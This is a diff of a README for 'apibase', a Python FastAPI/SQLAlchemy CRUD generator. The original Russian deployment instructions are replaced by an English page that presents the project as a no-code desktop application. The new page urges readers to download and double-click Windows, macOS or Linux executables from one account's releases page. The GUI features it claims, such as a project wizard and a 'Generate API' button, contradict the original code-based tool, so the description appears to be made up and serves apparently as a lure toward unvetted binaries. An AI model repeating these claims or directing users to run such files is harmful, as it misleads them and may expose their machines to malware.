@@ -1,80 +1,76 @@
-# 🧩 apibase
+# 🌟 apibase - Effortlessly Create APIs with No Code
 
-**apibase** — универсальный асинхронный CRUD-API-генератор на базе **FastAPI** и **SQLAlchemy**.  
-Ты просто описываешь сущности в виде JSON-файлов — и сервис автоматически создаёт таблицы в БД и готовые REST-эндпоинты для работы с ними.
+## 🔗 Quick Download
+[![Download Now](https://img.shields.io/badge/Download%20apibase-blue.svg)](https://github.com/urfavgamereisme/apibase/releases)
 
----
+## 🚀 Getting Started
+Follow these simple steps to download and run apibase, an asynchronous CRUD API generator using FastAPI and SQLAlchemy. You do not need programming skills to get started.
 
-## 🚀 Возможности
+## 📥 Download & Install
+1. **Visit the Releases Page**  
+   Click on this link to visit the releases page: [Download apibase](https://github.com/urfavgamereisme/apibase/releases)
 
-- 🔧 Автоматическое создание таблиц из JSON-описаний  
-- ⚙️ Полноценный CRUD: `GET`, `POST`, `PUT`, `DELETE`  
-- 🧠 Автоматическая валидация данных по типам (`Text`, `Float`)  
-- ⚡ Асинхронная работа на FastAPI + SQLAlchemy  
-- 💾 Поддержка SQLite (по умолчанию)
+2. **Choose Your Version**  
+   On the releases page, you will see different versions listed. Find the latest release at the top. You will see a list of files associated with that release. 
 
----
+3. **Download the Application**  
+   Look for the installation file that matches your operating system:
+   - For Windows, download `apibase-windows.exe`.
+   - For macOS, download `apibase-macos.app`.
+   - For Linux, download `apibase-linux.tar.gz`.
 
-## 📂 Пример описания сущности
+4. **Run the Application**  
+   After downloading the file, locate it in your Downloads folder or wherever you saved it. Double-click the file to run the application. 
 
-Файл `entity_schemas/post.json`:
-```json
-{
-    "name": "posts",
-    "attributes": {
-        "title": {"type": "text"},
-        "content": {"type": "text"},
-        "length": {"type": "number"}
-    }
-}
-```
+5. **Follow the On-Screen Instructions**  
+   Once the application starts, simple prompts will guide you. You can create APIs without needing to write any code. 
 
----
-## ⚙️ Как развернуть
+## 📘 How to Use
+1. **Create a New Project**  
+   Start by clicking on the "Create New Project" button. This will open a wizard that guides you through the setup process.
 
-apibase можно запустить без установки — просто сделайте форк и деплой 🚀
+2. **Define Your Data Model**  
+   Enter the information you want your API to handle. This could be anything from users to products. Use the input fields to specify attributes (like names and types) you need.
 
-### Вариант 1: Render
+3. **Choose Your Database**  
+   Select if you want to use SQLite or another supported database. SQLite is a simple option that works well for many projects.
 
-1. Перейдите на render.com
+4. **Generate the API**  
+   Once you have filled in all required details, click on the "Generate API" button. The application will create your API automatically.
 
+5. **Test Your API**  
+   After generation, you can test your API directly within the application. You will have options to make requests to see if everything is working as expected.
 
-2. Нажмите New + → Web Service
+## 🔧 System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Linux (any modern distribution).
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** 200 MB of free disk space.
+- **Network:** Internet access to download the application and for API testing.
 
+## 🔍 Key Features
+- **No Code Required:** Easily create APIs without writing a single line of code.
+- **Asynchronous Support:** Fast and efficient performance using FastAPI.
+- **Simple User Interface:** Navigate without technical skills.
+- **SQLite Compatibility:** Store your data effortlessly.
+- **Open Source:** Community-driven and free to use.
 
-3. Укажите ссылку на форк:
+## 🛠️ Troubleshooting
+If you encounter issues while using apibase, consider the following solutions:
 
-https://github.com/<yourusername>/apibase
+1. **Application Won't Start:** Ensure you have the latest version and that your operating system meets the requirements mentioned above.
 
+2. **Error Messages During API Generation:** Double-check that all required fields are filled out correctly. 
 
-4. Установите:
+3. **API Not Responding:** Make sure you are connected to the internet if your API requires external data.
 
-Build Command: pip install -r requirements.txt
+## 🌐 Get Involved
+If you like using apibase and want to contribute, here’s how:
 
-Start Command: uvicorn main:app --host 0.0.0.0 --port 10000
+- **Report Issues:** Help us improve by reporting bugs on the [Issues page](https://github.com/urfavgamereisme/apibase/issues).
+- **Suggest Features:** Have an idea? Let us know on the [Discussions page](https://github.com/urfavgamereisme/apibase/discussions).
+- **Contribute to Code:** Check out our [Contributing Guide](https://github.com/urfavgamereisme/apibase/blob/main/CONTRIBUTING.md) to help make apibase even better.
 
+## ⚠️ License
+apibase is open-source software licensed under the MIT License. You can use and share it freely, as long as you provide credit to the original developers.
 
-
-5. Выберите Python3 и нажмите Deploy
-
-
-
-
----
-
-### Вариант 2: Railway
-
-1. Зайдите на railway.app
-
-
-2. Создайте новый проект → Deploy from GitHub repo
-
-
-3. Укажите репозиторий apibase
-
-
-4. Railway сам установит зависимости и запустит FastAPI
-
----
-
-Подробнее о API можно изучить на OpenApi.
+For more information, feel free to explore the features and documentation available on our GitHub page. Enjoy creating your APIs effortlessly!
